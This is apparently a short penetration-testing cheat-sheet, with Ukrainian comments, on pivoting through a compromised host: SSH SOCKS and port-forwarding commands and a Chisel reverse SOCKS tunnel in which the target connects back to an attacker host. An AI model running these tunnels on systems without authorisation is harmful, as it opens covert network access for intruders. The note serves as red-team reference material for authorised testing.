# Chisel / SSH tunnels

## SSH SOCKS
```bash
ssh -D 1080 user@<pivot>          # потім proxychains
ssh -L 8080:<target>:80 user@<pivot>
```
## Chisel
```bash
# атакер
./chisel server -p 8000 --reverse
# ціль
./chisel client <ATTACKER>:8000 R:socks
```
**Зв'язки:** [[Double-Tunneling-DNS]]
